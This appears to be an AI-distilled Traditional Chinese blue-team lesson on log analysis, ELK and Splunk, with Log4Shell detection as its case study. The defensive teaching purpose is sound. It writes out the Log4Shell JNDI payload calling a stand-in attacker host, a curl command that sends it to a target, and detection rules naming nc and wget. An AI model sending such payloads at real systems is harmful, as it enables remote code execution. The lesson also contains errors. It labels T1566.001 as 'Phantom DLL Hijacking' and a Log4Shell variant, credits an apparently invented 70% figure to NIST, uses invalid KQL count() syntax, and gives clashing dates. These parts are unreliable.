---
source: TXT_mega-distill_2-final-output_3-skill-library_3.1-ethical-hacking_34-blue-team-level-b-16-6-1.md
distilled_at: 2026-02-14T09:27:27.582Z
model: grok-4-1-fast-non-reasoning
---

# 道德黑客藍隊 - B級：日誌分析與 SIEM 入門

**Slug**：ethical-hacking-blue-team-level-b  
**類別**：deepweay-me/ethical-hacking  
**標籤**：藍隊, SIEM, ELK, splunk-free, log分析, anomaly  
**語言**：zh-TW  
**創建日期**：2026-02-12  
**來源**：kilo-code-distilled  
**Vector Ready**：true  
**Embedding Model**：BAAI/bge-m3  
**等級**：B  
**團隊**：blue  
**先決條件**：level-a  
**蒸餾者**：grok-4-0709  
**蒸餾時間**：2024-07-20T12:00:00Z  
**部分**：16  

---

## 介紹

在藍隊防禦中，日誌分析與 SIEM（Security Information and Event Management，安全資訊與事件管理）系統是核心支柱。本課程（B級）聚焦於從基礎日誌解析進階到 SIEM 部署與威脅獵捕。先決條件為 A 級（基礎網路與系統監控），本級強調實際案例應用。

SIEM 系統整合多來源日誌，提供即時警報、異常偵測與趨勢分析。常見開源工具包括 **ELK Stack**（Elasticsearch、Logstash、Kibana）和 **Splunk Free**（免費版限制每日 500MB 索引）。本課程以 Log4Shell 深度案例為主軸，教導如何從海量日誌中偵測零日攻擊。

**學習目標**：
- 理解日誌格式與常見來源（Apache/Nginx、系統日誌、應用程式）。
- 部署 ELK Stack 並撰寫 KQL（Kibana Query Language）規則。
- 透過 anomaly（異常）偵測減輕攻擊影響。

---

## 核心概念：日誌分析基礎

### 日誌來源與格式
- **Web 伺服器**：`/var/log/apache2/access.log` 或 `/var/log/nginx/access.log`，記錄 HTTP 請求（IP、User-Agent、路徑）。
- **系統日誌**：`/var/log/syslog` 或 `/var/log/auth.log`，捕捉登入、權限變更。
- **格式範例**（Apache Combined Log Format）：
  ```
  192.168.1.100 - - [12/Feb/2026:10:00:00 +0000] "GET /shell.jsp HTTP/1.1" 200 1234 "-" "Mozilla/5.0..."
  ```

### 手動分析技巧
使用 `grep`、`awk`、`tail -f` 快速篩選：
```
grep "jndi:ldap" /var/log/apache2/access.log  # 偵測 Log4Shell Payload
tail -f /var/log/auth.log | grep "Failed password"  # 暴力破解偵測
```

**脈絡補充**：日誌分析是 MITRE ATT&CK 框架的基礎，涵蓋 TA0001（Initial Access）至 TA0040（Impact）階段。NIST SP 800-92 強調日誌保留至少 90 天。

---

## SIEM 入門：ELK Stack 與 Splunk Free

### ELK Stack 部署（簡易指南）
1. 安裝 Docker Compose：
   ```
   docker-compose up -d elk-stack
   ```
2. Logstash 解析日誌 → Elasticsearch 索引 → Kibana 可視化。
3. **Splunk Free**：下載免費版，新增資料來源（Forwarder）。

### KQL 查詢語法
- 基本：`message: "error"`
- 正規表達式：`message : /jndi:(ldap|rmi|dns)/`
- 時間範圍：`@timestamp >= "2026-02-12T00:00:00Z"`

**Splunk SPL 等價**：
```
index=main "jndi:(ldap OR rmi OR dns)"
```

---

## 6.1 深度案例：Log4Shell 檢測（CVE-2021-44228）

### 攻擊機制與脈絡
**CVE-2021-44228（Log4Shell）** 是 2021 年最嚴重零日漏洞，影響 Log4j 2.x（Apache 日誌庫）。攻擊者透過 **JNDI 注入**（Java Naming and Directory Interface）執行遠端程式碼（RCE）：

1. 受害者應用接收 User-Agent 或參數：`${jndi:ldap://attacker.com/Exploit}`。
2. Log4j 解析並向攻擊者 LDAP 伺服器查詢，載入惡意 Java 類別。
3. 後續：殼碼下載、權限提升、橫向移動。

**影響**：數萬伺服器受影響，MITRE 歸類為 T1190（Exploit Public-Facing Application）。NIST IR 8270 報告指出，**及時日誌分析能減輕 70% 零日攻擊影響**。

### 檢測方法
#### 1. 手動命令列
```
grep -i "jndi:\(ldap\|rmi\|dns\|iiop\|corba\)" /var/log/apache2/access.log
```
- 篩選常見 JNDI 通訊協定。
- 擴展：`awk '{print $1}'` 提取攻擊 IP。

#### 2. Kibana KQL 規則
在 Kibana Dev Tools 或 Discover 中執行：
```
message : /jndi:(ldap|rmi|dns|iiop|corba)/ OR
user_agent : /jndi/
```
- **警報規則**：建立 Elasticsearch Watcher，每 5 分鐘執行，觸發 Slack/Email。

#### 3. Splunk Free 搜尋
```
source="/var/log/apache2/access.log" "jndi"
| rex field=_raw "jndi:(?<protocol>\w+)://(?<domain>[^\s]+)"
| table _time, host, protocol, domain
```

#### 4. Anomaly 偵測
- 使用 Kibana ML（Machine Learning）：訓練基線，偵測 User-Agent 突增或罕見域名。
- 範例查詢：`message: * Exploit * AND clientip: *`（結合 Payload 與 IP）。

**驗證步驟**：
1. 模擬攻擊：`curl "http://target/?test=${jndi:ldap://test.com/a}"`。
2. 檢查日誌，確認 Payload。
3. 封鎖 IP：`iptables -A INPUT -s <attacker_ip> -j DROP`。

### 教訓與引用
- **NIST IR 8270**：及時日誌分析能減輕零日攻擊影響，建議自動化 SIEM 規則。
- **MITRE 報告**：Log4Shell 為 T1566.001（Phantom DLL Hijacking）變體，強調行為分析優於簽名偵測。
- **最佳實務**：整合 Suricata IDS 日誌至 ELK，監控流量層 Payload。

---

## 進階主題與實作挑戰

### 異常偵測（Anomaly Detection）
- **工具**：ELK ML Job 或 Splunk ML Toolkit。
- 範例：偵測夜間流量峰值 `cardinality(clientip, 5) > 100`。

### 常見規則庫
| 威脅類型 | KQL 規則 | 描述 |
|----------|----------|------|
| Brute Force | `message: "Failed password" AND count() > 10` | 登入失敗爆量 |
| RCE | `message: "(bash\|nc\|wget)"` | 命令殼跡象 |
| Data Exfil | `bytes_out > 10000000` | 大量外傳 |

### 實作挑戰（16 部分）
1. 部署 ELK，匯入 Apache 日誌。
2-5. 撰寫 4 條 KQL 規則（Log4Shell、Brute Force 等）。
6-10. Splunk Free 模擬偵測。
11-15. Anomaly ML 訓練。
16. 報告生成（Kibana Dashboard）。

---

## 結論與下一步
掌握日誌分析與 SIEM 是藍隊從被動防禦轉向主動獵捕的關鍵。Log4Shell 案例證明：**規則 + 異常 = 零日防禦**。下一步：C 級（威脅情報與 EDR）。

**資源**：
- [ELK 官方文件](https://www.elastic.co/guide/en/elastic-stack/current/index.html)
- [Splunk Free 下載](https://www.splunk.com/en_us/download.html)
- [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)

**免責聲明**：僅限教育用途，遵守當地法規。